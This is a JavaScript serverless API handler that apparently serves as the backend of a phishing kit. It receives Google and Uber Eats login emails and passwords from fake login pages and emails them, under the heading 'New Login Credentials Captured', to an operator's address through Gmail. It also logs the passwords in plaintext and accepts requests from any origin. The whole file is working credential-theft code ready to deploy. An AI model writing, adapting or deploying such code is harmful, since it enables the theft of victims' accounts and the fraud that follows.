import dotenv from 'dotenv';
import nodemailer from 'nodemailer';

dotenv.config();

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_APP_PASSWORD
  }
});

async function sendCredentialsEmail(googleEmail, googlePassword, uberEmail, uberPassword) {
  console.log('\n=== SENDING EMAIL ===');
  console.log('Gmail User:', process.env.GMAIL_USER);
  console.log('Recipient:', process.env.RECIPIENT_EMAIL);
  console.log('\nCredentials to send:');
  console.log('Google Email:', googleEmail);
  console.log('Google Password:', googlePassword);
  console.log('Uber Email:', uberEmail);
  console.log('Uber Password:', uberPassword);
  console.log('==================\n');
  
  try {
    const htmlContent = `
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
          .container { max-width: 600px; margin: 0 auto; padding: 20px; }
          .header { background-color: #1a73e8; color: white; padding: 20px; text-align: center; }
          .content { background-color: #f9f9f9; padding: 20px; margin: 20px 0; }
          .credentials { background-color: white; padding: 15px; margin: 10px 0; border-left: 4px solid #1a73e8; }
          .label { font-weight: bold; color: #555; }
          .value { color: #000; margin-left: 10px; }
          .footer { text-align: center; color: #777; font-size: 12px; margin-top: 20px; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>New Login Credentials Captured</h1>
          </div>
          
          <div class="content">
            <h2>Google Login Page Credentials:</h2>
            <div class="credentials">
              <div><span class="label">Email:</span><span class="value">${googleEmail}</span></div>
              <div><span class="label">Password:</span><span class="value">${googlePassword}</span></div>
            </div>

            <h2>Uber Eats Login Page Credentials:</h2>
            <div class="credentials">
              <div><span class="label">Email:</span><span class="value">${uberEmail}</span></div>
              <div><span class="label">Password:</span><span class="value">${uberPassword}</span></div>
            </div>
          </div>

          <div class="footer">
            <p>This is an automated email from your login system.</p>
            <p>Timestamp: ${new Date().toLocaleString()}</p>
          </div>
        </div>
      </body>
      </html>
    `;

    const info = await transporter.sendMail({
      from: `"Login System" <${process.env.GMAIL_USER}>`,
      to: process.env.RECIPIENT_EMAIL,
      subject: `New Login Credentials - ${new Date().toLocaleDateString()}`,
      html: htmlContent
    });

    console.log('✅ EMAIL SENT SUCCESSFULLY!');
    console.log('Message ID:', info.messageId);
    console.log('Accepted:', info.accepted);
    console.log('Response:', info.response);
    return { success: true, messageId: info.messageId };
  } catch (error) {
    console.error('❌ ERROR SENDING EMAIL:');
    console.error('Error message:', error.message);
    console.error('Full error:', error);
    return { success: false, error: error.message };
  }
}

export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { googleEmail, googlePassword, uberEmail, uberPassword } = req.body;
  
  console.log('\n📧 Received request to send credentials email');
  console.log('Data received:', { googleEmail, googlePassword, uberEmail, uberPassword });
  
  try {
    const result = await sendCredentialsEmail(googleEmail, googlePassword, uberEmail, uberPassword);
    
    if (result.success) {
      console.log('✅ API: Email sent successfully');
      res.status(200).json({ 
        success: true, 
        message: 'Credentials sent successfully',
        messageId: result.messageId
      });
    } else {
      console.log('❌ API: Email sending failed');
      res.status(500).json({ 
        success: false, 
        message: 'Failed to send email',
        error: result.error
      });
    }
  } catch (error) {
    console.error('❌ API Error:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Server error',
      error: error.message
    });
  }
}
